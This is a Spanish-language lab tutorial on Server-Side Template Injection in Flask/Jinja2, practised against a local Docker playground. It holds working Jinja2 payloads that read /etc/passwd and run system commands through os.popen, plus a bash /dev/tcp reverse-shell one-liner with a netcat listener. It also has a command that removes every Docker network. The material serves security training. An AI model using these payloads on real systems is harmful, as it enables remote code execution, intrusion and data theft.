

----
- Tag: #SERVER-SIDE #TEMPLATE #INJECTION #SSTI
----

El **Server-Side Template Injection** (**SSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.

Las plantillas de servidor son archivos que contienen código que se utiliza para generar **contenido dinámico** en una aplicación web. Los atacantes pueden aprovechar una vulnerabilidad de SSTI para inyectar código malicioso en una plantilla de servidor, lo que les permite ejecutar comandos en el servidor y obtener acceso no autorizado tanto a la aplicación web como a posibles datos sensibles.

Por ejemplo, imagina que una aplicación web utiliza plantillas de servidor para generar correos electrónicos personalizados. Un atacante podría aprovechar una vulnerabilidad de **SSTI** para inyectar código malicioso en la plantilla de correo electrónico, lo que permitiría al atacante ejecutar comandos en el servidor y obtener acceso no autorizado a los datos sensibles de la aplicación web.

En un caso práctico, los atacantes pueden detectar si una aplicación Flask está en uso, por ejemplo, utilizando herramientas como **WhatWeb**. Si un atacante detecta que una aplicación **Flask** está en uso, puede intentar explotar una vulnerabilidad de **SSTI**, ya que Flask utiliza el motor de plantillas **Jinja2**, que es vulnerable a este tipo de ataque.

Para los atacantes, detectar una aplicación Flask o Python puede ser un primer paso en el proceso de intentar explotar una vulnerabilidad de SSTI. Sin embargo, los atacantes también pueden intentar identificar vulnerabilidades de SSTI en otras aplicaciones web que utilicen diferentes frameworks de plantillas, como Django, Ruby on Rails, entre otros.

Para prevenir los ataques de SSTI, los desarrolladores de aplicaciones web deben validar y filtrar adecuadamente la entrada del usuario y utilizar herramientas y frameworks de plantillas seguros que implementen medidas de seguridad para prevenir la inyección de código malicioso.

---
# SSTI (Server Side Template Injection)

Existe un recurso en la web que es totalmenet gratutito llamado [Infayer.com](https://infayer.com/archivos/803)

Para resumirlo rápidamente, **SSTI** es una vulnerabilidad que aprovecha una implementación insegura de un motor de plantillas (*template engine*). Los motores de plantilla son empleados por las aplicaciones web para la presentación de datos dinámicos.

Por lo general, a menudo muchas inserciones de los usuarios que son posteriormente reflejadas en la respuesta de la aplicación web son interpretadas como vulnerabilidades de **Cross-Site Scripting (XSS)**, sin embargo, a través del aprovechamiento de esta vulnerabilidad es posible atacar directamente a los componentes internos del servidor web del objetivo.

Algunos motores de plantilla populares son los siguientes:

- **PHP**: Smarty, Twig
- **Java**: Velocity, FreeMarker
- **Python**: Jinja, Mako, Tornado
- **JavaScript**: Jade, Rage
- **Ruby**: Liquid

Todo lo que involucre el ataque como si directo al servidor es un server template injection, que van contra los usuarios que se aprovecha de plantillas para cargar contenido dinamico, cuando veamos que es más del lado del cliente para poder derivarlo a un XSS y robarle la sesión de un usuario o corresponda ahi estaríamos hablando de un CSTI (Cleint Site Template Injection) y otra cosa muy distinta el SSTI (Server Side Template Injection) 

Desplegamos el laboratorio virtual en el cual estaremos practicando:

Para a correr un docker run para convertir nuestro puerto 8089 al puerto 8089 del contenedor 

```bash
docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playgorund 
```

Al finalizar para que no quede alzado ese network en nuestro sistema debemos hacer un 

```bash
docker network ls 
docker network rm $(docker network ls -q)
```

o 

```bash
docker ps 
docker stop ID-CONTENEDOR
docker rm ID-CONTENEDOR
```
Para ver si esta alzado el servicio lo podemos hacer con 

```bash
docker ps 
```

Nos damos cuenta que esta corriendo un flask por detrás 

>FLASK: Es un "micro" framework escrito en python y concebido  para facilitar el desarrollo de aplicaciones web bajo el patrón MVC.

Es decir que si ahora nosotros abrimos nuestro `localhost:8089` en el navegador deberíamos ver una página como esta :

![Pasted image 20241004224134](https://hackmd.io/_uploads/BJBsI4RAA.png)

Ahora en el panel de login podemos ingresar cualquier nombre y nos debería aparecer el siguiente mensaje :

![Pasted image 20241004224310](https://hackmd.io/_uploads/HJ63U4AAC.png)

Esto estaría cargando plantillas para que de forma dinamica represente contenido, el cual puede ser modificado a través de la url : 

![image](https://hackmd.io/_uploads/HyfeP40CA.png)


Si jugaramos con whatweb para ver a lo que nos enfrentamos a tecnologías respecta o el gestor de contenido que pueda estar por detrás : 

```bash 
whatweb "http://127.0.0.1:8089/"
```
Nos damos cuenta que corre por detrás python en la siguiente versión 3.9.13 o si vieramos un servicio flask, se podría pensar en realizar en posibles SSTI que se puedan aplicar del lado del atacante como vector de ataqu.
![image](https://hackmd.io/_uploads/HylUK4CRC.png)


pero siempre que veamos que tenemos control de input en el ouput de la url, prueben siempre hacer lo siguiente a ver si lo calcula, en caso que si lo calcule se podría tensar la cosa

![image](https://hackmd.io/_uploads/HkFMq4ARR.png)

Nos damos que nos calcula la operatoria 
![image](https://hackmd.io/_uploads/S1mr94ARA.png)

Támbien hay una forma para hacer que el número `5` nos lo represente por el número de la derecha 

```bash 
{{'5'*5}}
```

![image](https://hackmd.io/_uploads/BkFaqVRC0.png)


si quieren saber de donde proviene todo esto, pueden revisar la página : 
- https://github.com/swisskyrepo/PayloadsAllTheThings

En donde podremos encontrar un monton de vulnerbilidades contempladas y podemos filtrar por `Server Side Template Injection`

Nos vamos al apartado de Python:
![image](https://hackmd.io/_uploads/H1FAsERCC.png)

Y dentro del repo nos indicará injectiones básicamos como la que acabamos de ver de `{{'5'*5}}` y muchos más ejemplos 


Uno como atacante lo primero que haría es tratar de leer un archivo de la máquina, tenemos varios ejemplos pero no todos son funcionales, la cuestión sería ir probando uno por uno como estos ejemplos: 

![image](https://hackmd.io/_uploads/SkYya4RCC.png)

```python 
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Una vez ejecutado el comando indicado, veremos que con éxito logramos listar el `/etc/passwd` de la máquina 

![image](https://hackmd.io/_uploads/rJr2T4RRA.png)

Podriamos probar con `id`

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
```python 
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

Si quisieramos obtener acceso a la máquina nosotros nos podríamos poner en la escucha por el puerto `443` desde nuestra consola con netcat:

```bash 
nc -nlvp 443
```

Y desde la url de la páguina en donde va el whoami, usar el tipico oneliner para obtener una revershell

```bash 
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/our-ip/443 0>%261"').read() }}
```

>& = %26 urlencode ya que normalmente la interpreta de diferente manera si no hacemos esto

Si le damos enter en la url con este comando y estamos a la escucha por el puerto 443 y estaríamos dentro de la máquina 

Para confirmar podemos hacer un hostname para saber la ip actual 

```bash 
hostname -I
```

![image](https://hackmd.io/_uploads/H1hcZHA0R.png)

Y por ende hemos acabado de comprometer la máquina.

Esta es una de los muchos más casos que existen para diferentes lenguajes de programación como java, django templates, groovy, la idea sería lo mismo pero existen payloads distintos que la página **PayloadsAllTheThings** las contempla 

Si nos encontramos con una web que nos permita ejecutar comando através de la url es cuestión de identificar el lenguaje e ir probando los payloads  